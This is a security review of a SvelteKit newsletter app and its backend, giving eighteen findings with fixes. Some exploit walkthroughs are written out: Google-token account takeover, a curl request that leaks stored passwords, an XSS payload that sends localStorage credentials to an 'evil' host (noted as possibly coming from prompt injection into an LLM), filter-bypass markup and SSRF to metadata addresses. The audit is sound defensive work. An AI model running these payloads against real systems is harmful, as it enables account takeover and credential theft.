# WS6 Security Review: frontend data layer and SvelteKit server routes

Scope: `some-awesome-newsletter` (SvelteKit 2, Svelte 5) plus the backend code paths in `ai-newsletter-translated` that the frontend auth model depends on. Read-only review, 2026-10-30. No secret values were read; only env var names.

Ownership legend:
- **WS6**: `src/components/systems/requests/**`, `src/components/store.ts`, `src/lib/{api,config,stores,utils}/**`, `src/lib/polar.ts`, `src/routes/api/**`, `+server.*` / `+page.server.*` / `+page.ts` (except oauth/login/signup), `src/hooks*.ts`, `svelte.config.js`, `vite.config.ts`.
- **WS7**: backend (`ai-newsletter-translated`).
- **WS3**: auth routes (`src/routes/oauth`, `src/routes/login`, `src/routes/signup`, `AuthForm.svelte`, the dashboard auth bootstrap).
- **UI**: Svelte components outside WS6 (call-site changes only; WS6 provides the helper).

## Summary table

| # | Severity | Finding | Owner |
|---|----------|---------|-------|
| 1 | Critical | Any Google ID token (any audience) overwrites any account's login secret: full account takeover | WS7 (+WS6 client change) |
| 2 | Critical | `GET /config` and `GET /all-configurations` are unauthenticated and leak `appPassword`, `webhookSharedSecret`, API key hashes, subscriber data | WS7 |
| 3 | Critical | Login "secret" is the Google `sub` or a 6-digit code that never expires, is reusable, and can be brute-forced | WS7 (+WS3) |
| 4 | High | `/api/portal?customerEmail=` opens any customer's Polar billing portal, no auth | WS6 |
| 5 | High | `subscribe-widget/subscribe` logs `THE_PASS`; THE_PASS branch is gated on the server's own origin, not the caller; THE_PASS is a master key in backend `multiAuth` | WS6 + WS7 |
| 6 | High | Stored/LLM/scraped HTML rendered with `{@html}` and detached `innerHTML` without sanitization on the same origin that holds credentials in localStorage | WS6 helper, UI call sites |
| 7 | High | Credentials persisted to 365-day non-HttpOnly, non-Secure cookies and localStorage; never cleared on logout | WS6 |
| 8 | High | Credentials (Google `sub`, ID token, email code) travel in URL query strings and are logged by both servers | WS3 + WS6 + WS7 |
| 9 | Medium | SSRF from `subscribe-widget/subscribe` to a configurator-controlled `webhookUrl` | WS6 |
| 10 | Medium | Polar webhook handlers are empty TODOs, no idempotency, no entitlement sync | WS6 |
| 11 | Medium | OAuth flow has no `state` (login CSRF) and dashboard accepts credentials from any link (session fixation) | WS3 |
| 12 | Medium | Backend CORS fully open, socket.io `origin: "*"`, socket room registration is first-come with no backend auth check | WS7 |
| 13 | Medium | Open redirect at backend `/lead-counter?leadUrl=` | WS7 |
| 14 | Medium | No security headers, no CSP, no `hooks.server.ts` | WS6 |
| 15 | Low | `/api/checkout` accepts arbitrary customer and metadata query params | WS6 |
| 16 | Low | `src/lib/polar.ts` hardcodes the sandbox API, logs PII, is unused | WS6 |
| 17 | Low | `help/+page.server.ts` returns a mock user in production; `import.meta.env.PUBLIC_*` is never populated by Vite | WS6 |
| 18 | Low | Misc credential logging in client code | WS6 |

---

## 1. Critical: account takeover through `GET /auth/:email?token_id=&client_id=` (WS7, client part WS6)

**Where**
- `ai-newsletter-translated/API/auth/verifyUserCode.ts:31-50`: if `token_id` and `client_id` are present, it verifies the ID token with `verifyGoogleIdToken(token, client_id)` and then `put("authCodes", email, { code: userInfo.sub })` for the **email in the URL path**.
- `ai-newsletter-translated/helper/verifyGoogleIdToken.ts:10-13`: `audience: clientId` where `clientId` comes from the caller's query string.
- Nothing compares `userInfo.email` (or `email_verified`) to `:email`.

**Exploit**
1. Attacker obtains any valid Google ID token for their own Google account from any OAuth client (Google OAuth Playground works; audience is the Playground client id).
2. `GET https://ai-newsletter-translated.onrender.com/auth/victim@example.com?code=x&token_id=<attacker token>&client_id=<playground client id>`.
3. Backend overwrites `authCodes/victim@example.com` with the attacker's `sub`, then returns 200.
4. Attacker sends `x-auth-email: victim@example.com`, `x-auth-code: <attacker sub>` to every protected endpoint: full read/write of the victim's configuration, subscribers, sending, billing. The victim is also locked out of email-code login, because `sendCodeToEmail.ts:64` sees a code longer than 6 chars and emails "you signed up with Google" instead of a new code.

**Fix (WS7)**
- Pin the audience to the server's own client id from env: `audience: Deno.env.get("GOOGLE_CLIENT_ID")`; ignore `client_id` from the request.
- Require `payload.email_verified === true` and `payload.email.toLowerCase() === email.toLowerCase()`; otherwise 403.
- Do not store the `sub` as a bearer secret (see finding 3). After verifying the ID token, mint a random server session token (32 bytes, `crypto.getRandomValues`), store its SHA-256 hash with an expiry, and return it in an HttpOnly cookie or response body.
- Move this to `POST /auth/google` with the token in the body.

**Fix (WS6)**: `src/components/systems/requests/askIsAuthCodeValid.ts:16-23` stops putting `code`, `token_id`, `client_id` in the URL; send them as a POST JSON body once WS7 ships the POST endpoint, and `encodeURIComponent(configuratorEmail)` in any path segment meanwhile. `getAuthHeaders.ts:35-36` stops sending `x-auth-token-id` and `x-auth-client-id` on every request.

## 2. Critical: unauthenticated configuration read (WS7)

**Where**
- `ai-newsletter-translated/API/configuration/getConfigurationEndpoint.ts:11-50`: `GET /config` trusts the `x-auth-email` header with no middleware (`authMiddleware` is imported but unused). If no config exists, it **creates** one for that email.
- Its sanitizer only removes `openAiApiKey`, `email.auth`, `email.host`, `newsSources[].email.auth.pass`. It returns `appPassword` (top-level SMTP app password, `types.ts:93`), `webhookSharedSecret`, `webhookUrl`, `apiKeys[].hash`, `webhookGroups` (CMS credentials), subscribers and leads.
- `API/configuration/getAllConfigurationsEndpoint.ts:6-33`: `GET /all-configurations?limit=&offset=` dumps every tenant's config with the same weak sanitizer and no auth.
- The frontend server route relies on this hole: `src/routes/subscribe-widget/subscribe/+server.ts:49-56` fetches `/config` with only `x-auth-email`.

**Exploit**: `curl -H 'x-auth-email: victim@example.com' https://ai-newsletter-translated.onrender.com/config` returns the victim's Gmail app password and webhook HMAC secret. `/all-configurations` enumerates every customer.

**Fix (WS7)**: put `authMiddleware(true)` on `GET /config` and derive the document id from `req.userEmail`, never from a raw header. Remove `/all-configurations` from the public router (or gate it behind an admin-only server token). Replace the deny-list sanitizer with an allow-list DTO (`toPublicConfig(config)`), and never return `appPassword`, `webhookSharedSecret`, `apiKeys`, `email.*`, webhook credentials. Encrypt `appPassword` and webhook credentials at rest. Rotate every stored app password and shared secret after the fix ships, since they must be assumed leaked. Add a separate `GET /public-config/:configuratorId` that returns only branding fields for the subscribe widget.

## 3. Critical: weak login secret model (WS7, WS3)

**Where**
- `db/auth/isAuthenticated.ts:36-42`: auth is `stored.code === header code`. No expiry, no single use, no attempt counter. The same value is the long-term session credential sent on every request.
- For Google users the stored code is the Google `sub` (`verifyUserCode.ts:46-50`, `src/routes/oauth/+server.js:53`). `sub` is a stable public identifier: it is exposed to every third-party app the user signs into with Google, it never rotates, and it is not revocable. It must not be a bearer secret.
- Email code: `helper/generateCode.ts:5` uses `Math.random()` (not a CSPRNG), 6 digits. `sendCodeToEmail.ts:37-59` rate-limits *sending* (5 per 10 min per email, in-memory, lost on restart, per email only) but `GET /auth/:email` (verification) has no rate limit, so 10^6 guesses against a code that never expires succeeds in hours from a few IPs.
- `isAuthenticated.ts:65` (`authMiddleware`) and `sendCodeToEmail.ts:105` log the code in plaintext; `main.ts:49` logs all request headers (including `x-auth-code`) for every request.

**Fix (WS7)**
- Codes: `crypto.getRandomValues`, 6 to 8 digits, store a hash plus `expiresAt` (10 min) plus `attempts`; invalidate on first success; lock after 5 failed attempts; rate-limit verification by email and by IP.
- On success, issue a random session token (hash stored, 7 to 30 day expiry, revocable, rotated on login). Prefer an HttpOnly, Secure, SameSite=Lax cookie on a shared parent domain, or a short-lived token returned to a SvelteKit server route that sets the cookie (see finding 7).
- Remove header logging in `main.ts:48-51` (log method, path, status, latency only) and remove code logging.

## 4. High: `/api/portal` opens any customer's billing portal (WS6)

**Where**: `src/routes/api/portal/+server.ts:9-33`. `getCustomerId` reads `customerEmail` from the query, looks the customer up by `externalId`, creates one if missing, and `@polar-sh/sveltekit` (`node_modules/@polar-sh/sveltekit/dist/index.js:58-82`, v0.4.9) creates a customer session and 302s to the portal URL. There is no authentication.

**Exploit**: `GET https://aibanewsletter.club/api/portal?customerEmail=victim@example.com` lands the attacker in the victim's Polar customer portal: invoices, billing address, payment method last4, ability to cancel or change the subscription. It also lets anyone create Polar customer records for arbitrary emails.

**Fix (WS6)**: authenticate the caller server-side and ignore any email from the query.
```ts
// src/routes/api/portal/+server.ts
export const GET: RequestHandler = async (event) => {
  const email = await requireUser(event);            // src/lib/api/auth.server.ts
  const customer = await polar.customers.getExternal({ externalId: email }).catch(() => null);
  if (!customer) return new Response('No billing account', { status: 404 });
  const s = await polar.customerSessions.create({ customerId: customer.id });
  return new Response(null, { status: 303, headers: { Location: s.customerPortalUrl, 'Cache-Control': 'no-store' } });
};
```
`requireUser` validates the session (interim: reads `x-auth-email`/`x-auth-code` from the request and calls the backend `GET /auth/:email`; target: HttpOnly session cookie). Because a link-click GET cannot carry custom headers, until the session cookie exists the dashboard should `fetch('/api/portal', { method: 'POST', headers: getAuthHeaders() })`, receive `{ url }` as JSON, then navigate. Do not create customers here; customers are created at checkout.

## 5. High: THE_PASS handling in `subscribe-widget/subscribe` (WS6, WS7)

**Where**
- `src/routes/subscribe-widget/subscribe/+server.ts:18-24`: builds `{ email, name, pass: THE_PASS }` and logs it with `JSON.stringify(body)`: the master password goes to the hosting provider's log stream on every subscribe.
- `:33`: `url.origin.includes("aiban.news") || url.origin.includes("localhost")`. `url.origin` is this SvelteKit server's own origin, not the caller's. On a deployment whose hostname contains `aiban.news` every caller takes the THE_PASS branch; `includes` also matches `aiban.news.evil.com`-style hosts if the app is ever served there.
- `:35-42` sends `x-auth-email: configuratorId` plus `pass: THE_PASS` to `POST /users/:configuratorId/:newsSourceId`.
- Backend `db/auth/multiAuth.ts:37-46`: if `body.pass === system.secret.the_pass`, it sets `req.userEmail = x-auth-email` (any value) and skips all other checks, on every route using `multiAuthMiddleware` (`generateSecretEndpoint`, `storeWebhookEndpoint`, `searchUsersEndpoint`, `addNewsletterUserEndpoint`, `getNewsletterUsersByNewsSourceEndpoint`, `getSegmentedSubscribersEndpoint`).
- `:28` validates fields after logging, and never validates the email format.

**Exploit**: anyone can POST `{email, configuratorId, newsSourceId}` and subscribe arbitrary addresses to any newsletter (list bombing, spam complaints that burn the sender's domain reputation). Anyone who reads the logs gets THE_PASS, which acts as a master key for every tenant on six backend routes, including `generateSecret` and `storeWebhook` (redirect a tenant's webhook to an attacker).

**Fix (WS6)**: delete lines 24 and 34 logging; remove `pass` from `body` entirely and delete the THE_PASS branch. Public subscription should call a dedicated unauthenticated backend endpoint (`POST /public/subscribe`) that only ever creates a *pending* subscriber and sends a double opt-in email. Validate input with a schema (`email` RFC-ish and max 254 chars, ids `^[A-Za-z0-9@._-]{1,128}$`), rate-limit per IP and per email, and add a honeypot or Turnstile token. Remove `THE_PASS` from the frontend `.env` once nothing uses it.

**Fix (WS7)**: delete the `pass` branch in `multiAuth.ts`, rotate `system/secret.the_pass`. If server-to-server calls are needed, use a dedicated service token compared with a constant-time comparison and scoped to one route.

## 6. High: HTML injection sinks (WS6 helper, UI call sites)

All `{@html}` sinks in `src/` and what feeds them:

| File:line | Source of content | Sanitized |
|---|---|---|
| `src/routes/article/+page.svelte:43` `article.content` | LLM output from scraped pages (backend `GET /article/:id`, no sanitizer in backend) | No |
| `src/routes/articles/+page.svelte:392,394` title, content | same | No |
| `src/components/systems/steps/StepsTowardsPublish/stages/H_Dashboard/Newspaper/Newspaper.svelte:356,358` | same, on the authenticated dashboard | No |
| `src/components/ArticleModal/ArticleModal.svelte:49` (+ `:26` detached `innerHTML`) | same | No |
| `src/components/articles/FeaturedArticlesGrid.svelte:55,56,65,66,74,75` (+ `:20,28,37` detached `innerHTML`) | same | No |
| `src/components/articles/TextArticlesGrid.svelte:48,49,57,64,71` (+ `:19,28`) | same | No |
| `src/components/systems/steps/StepsTowardsPublish/stages/NewFlow/Step08_Generate.svelte:194` `previewHtml` | backend-generated newsletter HTML containing LLM/scraped text | No |
| `src/components/systems/steps/StepsTowardsPublish/stages/NewFlow/Step05_Signature.svelte:260` | user signature (Quill or LLM generated) | Regex `stripScripts` at `:224-232`, bypassable (`<img src=x onerror=alert(1)>` unquoted, `<svg onload=...>`, `javascript:` URLs) |
| `src/components/systems/steps/StepsTowardsPublish/stages/H_Dashboard/Config/toggles/EmailSignatureToggle.svelte:174` | stored `config.emailSignature` | No |
| `src/components/systems/texts/HTMLTextLettersClassWrapper/HTMLTextLettersClassWrapper.svelte:49` (+ `:18,38`) | slotted developer markup | Developer controlled, low |
| `src/components/SVG/SVG.svelte:50` | fetch of local `icons/*.svg`, cached in localStorage | Developer controlled; any XSS can persist itself here via `local-<src>` keys |
| `src/components/common/CodeFormatter.svelte:27` | highlight.js output (escapes input) | Safe |
| `Step07_Selector.svelte:89,91,93`, `Step01_Frequency.svelte:47`, `EmailCredentialsToggle.svelte:48,51,72,76,80` | i18n strings | Developer controlled, low |

Quill (`Step05_Signature.svelte:81`, `InteractiveSignatureEditor.svelte:54`, `EmailSignatureToggle.svelte:60`) assigns `quill.root.innerHTML = currentBody` with stored HTML, which bypasses Quill's clipboard sanitization.

Note: `document.createElement('div').innerHTML = html` is not inert. `<img src=x onerror=...>` executes even when the div is never attached, so the "preview text" helpers are sinks too. Use `new DOMParser().parseFromString(html, 'text/html')` (inert) or `template.content`.

**Exploit**: a scraped page (or prompt injection in it) makes the LLM emit `<img src=x onerror="fetch('//evil/?'+localStorage.authCode+localStorage.configuratorEmail)">`. It renders on the public `/articles` page and on the dashboard Newspaper tab on the same origin where `authCode` lives in localStorage and JS-readable cookies: every logged-in customer who views it is taken over.

**Fix**
- WS6: add `src/lib/utils/sanitizeHtml.ts` using `dompurify` (client) / `isomorphic-dompurify` (SSR):
  ```ts
  import DOMPurify from 'isomorphic-dompurify';
  export const sanitizeHtml = (html: string) => DOMPurify.sanitize(html ?? '', {
    USE_PROFILES: { html: true },
    FORBID_TAGS: ['style', 'form', 'input', 'iframe', 'object', 'embed'],
    FORBID_ATTR: ['style'],
    ALLOWED_URI_REGEXP: /^(?:https?|mailto):/i,
  });
  export const htmlToText = (html: string) =>
    new DOMParser().parseFromString(html ?? '', 'text/html').body.textContent ?? '';
  ```
  Add a DOMPurify hook that sets `rel="noopener noreferrer nofollow"` and `target="_blank"` on links.
- UI: wrap every non-i18n `{@html x}` in `{@html sanitizeHtml(x)}`; titles should be plain `{title}` (they are text); replace detached-div helpers with `htmlToText`; replace `stripScripts` with `sanitizeHtml`; render `previewHtml` in `<iframe sandbox srcdoc={previewHtml}>` (no `allow-scripts`, no `allow-same-origin`), which also isolates email CSS.
- WS7: sanitize LLM output before storing articles (defense in depth), and sanitize `emailSignature` on save.
- CSP from finding 14 blocks inline handlers as a second layer.

## 7. High: credential storage on the client (WS6)

**Where**
- `src/components/store.ts:26-62` `keysToSave` includes `authCode`, `tokenId`, `clientId`, `configuratorEmail`, `user`, `subscribers`, `leads`, full billing address.
- `src/components/store.ts:255-267` `setCookie`: `name=value; expires=+365d; path=/`, no `Secure`, no `SameSite`, not HttpOnly (cannot be, it is set from JS). `:286-292` writes every key to a cookie **and** to localStorage on every `saveToStore`.
- `src/components/systems/requests/getAuthHeaders.ts:27-40` reads the credentials from localStorage and also sends `picture` and `given_name` as request headers (non-Latin-1 names make `fetch` throw `TypeError: Invalid header value`, and they leak profile data to the API logs).
- `src/components/systems/requests/logout.ts:1-11` clears localStorage but not the cookies, so `authCode` survives logout for a year.
- `src/lib/stores/session.ts:17-29` a second, unused-by-backend session copy in localStorage.

**Exploit**: any XSS (finding 6) or malicious browser extension reads the long-lived credential. The cookies are also sent to every SvelteKit request; `subscribers` and `leads` in cookies can exceed header limits and make the whole site return 431/400 for large customers. On shared computers logout does not log out.

**Fix (WS6)**
- Immediately: delete the `setCookie(key, value)` call in `setAllKeysToSaveInLocalStorage`, and add a one-time cleanup that expires every legacy key cookie (`document.cookie = k + '=; Max-Age=0; path=/'`). Remove `tokenId`, `clientId`, `subscribers`, `leads`, `user`, and billing address fields from `keysToSave` (refetch them). Have `logout()` also expire the cookies and call a backend logout once it exists.
- `getAuthHeaders.ts`: return only `Accept`, `Content-Type`, `x-auth-email`, `x-auth-code`, `x-user-language`. Drop `picture`, `given_name`, `x-auth-token-id`, `x-auth-client-id`.
- Target design (with WS3/WS7): SvelteKit `+server.ts` login endpoints receive the backend session token and set it as `__Host-aiban_session` (HttpOnly, Secure, SameSite=Lax, Path=/). Client code calls same-origin `src/routes/api/**` proxies (in `src/lib/api/`), which attach the token server-side. JS never sees the credential.

## 8. High: credentials in URLs and logs (WS3, WS6, WS7)

**Where**
- `src/routes/oauth/+server.js:50-75` puts `x-auth-token-id` (ID token), `x-auth-code` (Google `sub`), `x-auth-email`, and the client id in the `/dashboard` redirect query string. Lines 23, 36, 40, 46, 68 log the OAuth code, full credentials (access token and refresh token, because `login/+page.server.js:21,27` requests `access_type: 'offline'` and `prompt: 'consent'` for no reason), the ID token and user info.
- `src/lib/ui/organisms/AuthForm.svelte:123` puts the email code in the URL.
- `src/routes/dashboard/+layout.svelte:23-35` reads them and calls `replaceState`, but the URL has already been recorded in browser history (it is replaced, but the original request line hits the host's access logs) and in server logs.
- `src/components/systems/requests/askIsAuthCodeValid.ts:16-18` sends code and ID token as query params on every dashboard load.
- `src/components/systems/requests/getConfiguratorSession.ts:28` `console.log("get(store).authCode", ...)`.
- Backend `main.ts:49` logs all headers; `isAuthenticated.ts:65` logs the code.

**Fix**
- WS3: `oauth/+server.js` should verify the ID token server-side, exchange it with the backend for a session token, set the HttpOnly cookie (finding 7) and `redirect(303, '/dashboard')` with no query. Remove all `console.log` of codes and tokens; drop `access_type: 'offline'` and `prompt: 'consent'`.
- WS6: remove the log at `getConfiguratorSession.ts:28`; switch `askIsAuthCodeValid` to POST; set `Referrer-Policy` and `Cache-Control: no-store` for `/dashboard` and `/oauth` (finding 14).
- WS7: stop logging headers and codes.

## 9. Medium: SSRF in `subscribe-widget/subscribe` (WS6)

**Where**: `src/routes/subscribe-widget/subscribe/+server.ts:63-89`. `webhookUrl` comes from the configurator's stored config and is fetched server-side with no scheme, host, port, redirect, timeout, or size restrictions; the response JSON is trusted for `apiKey`.

**Exploit**: a tenant sets `webhookUrl` to `http://169.254.169.254/...`, `http://localhost:xxxx/` or an internal service of the SvelteKit host; any anonymous caller then triggers the request. Blind SSRF plus port scanning; with finding 2 the attacker can also read other tenants' webhook settings.

**Fix (WS6)**: add `src/lib/utils/safeFetch.ts`: require `https:`, reject IP literals, resolve DNS and reject private, loopback, link-local, CGNAT and metadata ranges (IPv4 and IPv6), `redirect: 'error'`, `AbortSignal.timeout(5000)`, cap body at 64 KB, validate `apiKey` is a string under 256 chars. Better: drop the pattern where the frontend asks a tenant server for an API key on every subscription; the public subscribe endpoint (finding 5) makes it unnecessary. WS7 should validate `webhookUrl` the same way in `storeWebhookEndpoint.ts`.

## 10. Medium: Polar webhook (WS6)

**Where**: `src/routes/api/webhook/polar/+server.ts:4-12`.

Signature verification **is** in place: `@polar-sh/sveltekit@0.4.9` `Webhooks` (`dist/index.js:85-112`) calls `validateEvent` from `@polar-sh/sdk/webhooks` (Standard Webhooks HMAC over `webhook-id`, `webhook-timestamp`, body, with timestamp tolerance) and returns 403 on `WebhookVerificationError`. If `POLAR_WEBHOOK_SECRET` is unset the `!` hides it and requests fail with 500 (fail closed, but noisy).

Problems: both handlers are empty TODOs, so paid plans are never applied through this route (the backend has its own `billingRouter`; two webhook receivers for one provider is a drift risk). No idempotency by `webhook-id`. `onSubscriptionCanceled`, `onSubscriptionRevoked`, `onOrderPaid`, refunds are not handled.

**Fix (WS6)**: decide one receiver. If SvelteKit stays the receiver: on boot assert the secret exists; implement `onPayload` that forwards `{ id: webhook-id, type, data }` to a backend internal endpoint signed with a dedicated HMAC service secret; the backend stores processed `webhook-id`s (Firestore doc with TTL) and ignores repeats; throw on forwarding failure so the handler returns 5xx and Polar retries. Handle created, updated, active, canceled, revoked, uncanceled and order.paid; map plan from `product_id` server-side, never from metadata. Otherwise delete this route and point Polar only at the backend.

## 11. Medium: OAuth login CSRF and session fixation (WS3)

**Where**: `src/routes/login/+page.server.js:20-28` generates the auth URL without `state` or PKCE; `src/routes/oauth/+server.js:22` accepts any `code`. `src/routes/dashboard/+layout.svelte:23-46` accepts `x-auth-email` / `x-auth-code` from any link and saves them.

**Exploit**: attacker sends the victim `https://aibanewsletter.club/dashboard?x-auth-email=attacker@x.com&x-auth-code=<attacker sub>`. The victim is now silently working inside the attacker's account (connects their Gmail app password, imports their subscriber list, which the attacker then reads).

**Fix (WS3)**: random `state` stored in an HttpOnly cookie and checked in `/oauth`, plus PKCE (`code_challenge_method: 'S256'`). Dashboard must never accept credentials from the URL once the cookie session exists.

## 12. Medium: backend CORS and socket.io (WS7)

**Where**: `main.ts:55` `app.use(cors())` (all origins), `main.ts:38-41` socket.io `origin: "*"`. `socket/socketHandler.ts:23-31` calls `registerID(id, accessCode)` before `isAccessAllowed`: the first socket to claim an id defines its access code, with no check against `authCodes`.

**Risk**: any site can call the API with stolen header credentials; a socket client that registers a victim email first receives that tenant's live logs (which include emails and send results).

**Fix (WS7)**: `cors({ origin: ['https://aibanewsletter.club', 'https://www.aibanewsletter.club', 'http://localhost:5173'], allowedHeaders: [...], credentials: true })`; same allow-list for socket.io; authenticate sockets in `io.use()` against the real session token, never auto-register.

## 13. Medium: open redirect (WS7)

**Where**: `API/leads/addLeadCountEndpoint.ts:114` `res.redirect(String(leadUrl))`. Frontend caller `src/components/systems/steps/StepsTowardsSubscribe/stages/D_Subscribed.svelte:20-29` builds the URL without `encodeURIComponent`.

**Fix (WS7)**: look up the lead URL server-side from the stored news source by id, or sign `leadUrl` (HMAC) when the newsletter is generated and verify before redirecting; allow only `https:`. UI: `encodeURIComponent` every query param.

## 14. Medium: no security headers or CSP (WS6)

There is no `src/hooks.server.ts` and `svelte.config.js` has no `kit.csp`. Add both.

**What the app actually loads** (from `src/`, `src/app.html`, `static/`):
- Scripts: own bundle only (no third-party `<script>`; Quill, socket.io-client, highlight.js are npm imports; Google login is a server redirect, not GSI).
- Styles: own bundle, Svelte inline `style=` attributes and transitions (needs `'unsafe-inline'` for style), `@use 'https://cdn.quilljs.com/1.3.6/quill.snow.css'` in three components (should be replaced by `import 'quill/dist/quill.snow.css'`).
- Fonts: self-hosted (`static/fonts`, `@font-face` in `src/styles/global.scss`).
- Images: `images.pexels.com` backgrounds, article images from arbitrary scraped hosts, logos and avatars (`lh3`/`ci3.googleusercontent.com`, `img.mysignature.io`), `data:` and `blob:` from the logo uploader (`Image.svelte:77,86`).
- Media: `cdn.cosmicjs.com` (UI sounds, `audioInteractions.ts:16,21`), `videos.pexels.com` (`SoftTitle.svelte:7`).
- Connect: `https://ai-newsletter-translated.onrender.com` (REST) and `wss://` same host (socket.io, `SocketClient.svelte:34`); `http://localhost:8000` / `ws://localhost:8000` in dev.
- Frames: `https://www.youtube.com/embed/...` (`demo/HeroBanner.svelte:7`).
- Navigations: Google accounts after the login form POST, Polar checkout and portal via 302 (not restricted by CSP, but `form-action` applies to the form POST redirect chain).

**Proposed CSP (production)**, set via `kit.csp` so SvelteKit adds nonces to its own inline bootstrap script:
```
default-src 'self';
script-src 'self' 'nonce-{auto}' 'strict-dynamic';
style-src 'self' 'unsafe-inline' https://cdn.quilljs.com;
img-src 'self' data: blob: https:;
font-src 'self' data:;
media-src 'self' https://cdn.cosmicjs.com https://videos.pexels.com;
connect-src 'self' https://ai-newsletter-translated.onrender.com wss://ai-newsletter-translated.onrender.com;
frame-src https://www.youtube.com https://www.youtube-nocookie.com;
worker-src 'self' blob:;
object-src 'none';
base-uri 'self';
form-action 'self' https://accounts.google.com;
frame-ancestors 'none';
upgrade-insecure-requests;
report-to csp
```
For `/subscribe-widget` (meant to be embedded on customer sites) override `frame-ancestors *` (or a per-tenant allow-list) and omit `X-Frame-Options`. Ship as `Content-Security-Policy-Report-Only` for one week first.

`svelte.config.js`:
```js
kit: {
  adapter: adapter(),
  csp: {
    mode: 'auto',
    directives: {
      'default-src': ['self'],
      'script-src': ['self', 'strict-dynamic'],
      'style-src': ['self', 'unsafe-inline', 'https://cdn.quilljs.com'],
      'img-src': ['self', 'data:', 'blob:', 'https:'],
      'font-src': ['self', 'data:'],
      'media-src': ['self', 'https://cdn.cosmicjs.com', 'https://videos.pexels.com'],
      'connect-src': ['self', 'https://ai-newsletter-translated.onrender.com', 'wss://ai-newsletter-translated.onrender.com'],
      'frame-src': ['https://www.youtube.com', 'https://www.youtube-nocookie.com'],
      'worker-src': ['self', 'blob:'],
      'object-src': ['none'],
      'base-uri': ['self'],
      'form-action': ['self', 'https://accounts.google.com'],
      'upgrade-insecure-requests': true
    }
  }
}
```
(Add `http://localhost:8000 ws://localhost:8000` to `connect-src` when `process.env.NODE_ENV !== 'production'`. `frame-ancestors` is set in the hook because it differs per route.)

`src/hooks.server.ts`:
```ts
import type { Handle } from '@sveltejs/kit';
export const handle: Handle = async ({ event, resolve }) => {
  const res = await resolve(event);
  const p = event.url.pathname;
  const embeddable = p.startsWith('/subscribe-widget');
  res.headers.set('Strict-Transport-Security', 'max-age=63072000; includeSubDomains; preload');
  res.headers.set('X-Content-Type-Options', 'nosniff');
  res.headers.set('Referrer-Policy', p.startsWith('/dashboard') || p.startsWith('/oauth') ? 'no-referrer' : 'strict-origin-when-cross-origin');
  res.headers.set('Permissions-Policy', 'camera=(), microphone=(), geolocation=(), payment=(), usb=(), interest-cohort=()');
  res.headers.set('Cross-Origin-Opener-Policy', 'same-origin-allow-popups');
  res.headers.set('X-DNS-Prefetch-Control', 'off');
  if (!embeddable) res.headers.set('X-Frame-Options', 'DENY');
  const csp = res.headers.get('content-security-policy');
  if (csp) res.headers.set('content-security-policy', csp + `; frame-ancestors ${embeddable ? '*' : "'none'"}`);
  if (p.startsWith('/dashboard') || p.startsWith('/oauth') || p.startsWith('/api/')) res.headers.set('Cache-Control', 'no-store');
  return res;
};
```
Also add a same-origin check for state-changing `/api/**` and `/subscribe-widget/subscribe` requests (reject when `Origin` is present and not in the allow-list), and a simple per-IP token bucket in the hook for those paths.

## 15. Low: `/api/checkout` trusts query params (WS6)

`src/routes/api/checkout/+server.ts:4-9` with `@polar-sh/sveltekit` `Checkout` (`dist/index.js:9-40`) forwards `products`, `customerEmail`, `customerExternalId`, `customerId`, `metadata`, `customerMetadata`, `discountId`, `allowDiscountCodes` straight from the query; malformed JSON in `metadata` throws a 500. Anyone can create checkouts bound to another customer's `externalId` or with arbitrary metadata, which matters if fulfilment trusts them. Fix: wrap it; allow only product ids from a server-side allow-list (`src/lib/config/plans.config.ts`), set `externalCustomerId` from the authenticated user, drop client `metadata` and `customerId`, and have fulfilment map plan by `product_id` only.

## 16. Low: `src/lib/polar.ts` (WS6)

Hardcodes `https://sandbox-api.polar.sh` (lines 8, 23) while the routes use production, logs customer emails and full API responses (7, 14, 35), builds the path without `encodeURIComponent(email)`, and is not imported anywhere. Delete it, or rewrite on `@polar-sh/sdk` with `server: env.POLAR_SERVER` and no PII logging.

## 17. Low: config and mock code (WS6)

- `src/routes/help/+page.server.ts:4-13`: `mockMode = !import.meta.env.VITE_STRIPE_PUBLISHABLE_KEY` is always true (the app uses Polar, the var does not exist in `.env`), so production `/help` returns a fake user and fake usage. Remove mock data or gate on `dev` from `$app/environment`.
- `src/lib/config/runtime.ts:2-11` reads `import.meta.env.PUBLIC_*`. Vite only exposes `VITE_` by default, so these are always undefined and `PUBLIC_AUTH_FORCE_MOCK` cannot be turned on or off. Use `$env/static/public` (or `$env/dynamic/public`). Nothing private is imported into client-reachable modules: all `$env/*/private` imports are in `+server.*`, `+page.server.*` or `src/lib/polar.ts` (server only by use; rename to `polar.server.ts` so SvelteKit enforces it).
- `.env` names present: `SECRET_CLIENT_ID`, `SECRET_CLIENT_SECRET`, `POLAR_ACCESS_TOKEN`, `POLAR_ORGANIZATION_ID`, `POLAR_ORGANIZATION_SLUG`, `POLAR_SUCCESS_URL`, `POLAR_WEBHOOK_SECRET`, `THE_PASS`. `.gitignore` excludes `.env*`. Backend repo has `serviceAccountKey.json`, `typesensecloudserviceaccount.json` and `secrets/` in the working tree; WS7 should confirm they are git-ignored and not baked into the `Dockerfile` image.
- `svelte.config.js` uses `adapter-auto`; pin the real adapter so header behaviour is predictable.

## 18. Low: client logging (WS6)

`src/components/systems/requests/getConfiguratorSession.ts:28` logs `authCode`; `getUsersFromRawFileOrText.ts:34` logs request headers (including `x-auth-code`); `src/components/SVG/SVG.svelte:28` logs asset URLs. Remove, and add an ESLint `no-console` rule (allow `warn`, `error`) for `src/components/systems/requests/**` and `src/lib/**`.

---

## Recommended order

1. WS7 today: findings 1 and 2 (pin audience, bind email, auth `/config`, remove `/all-configurations`), then rotate app passwords, webhook secrets, THE_PASS.
2. WS6 today: finding 4 (portal), finding 5 (remove THE_PASS log and branch), finding 7 (stop writing cookies, expire legacy cookies, trim `keysToSave` and `getAuthHeaders`), finding 18.
3. WS6 this sprint: `sanitizeHtml` helper and UI call sites (finding 6), `hooks.server.ts` plus `kit.csp` in report-only (finding 14), SSRF guard (finding 9), webhook decision (finding 10).
4. WS3 + WS7: real session tokens and HttpOnly cookie, OAuth `state` and PKCE, code expiry and attempt limits (findings 3, 8, 11), CORS and socket auth (12), open redirect (13).
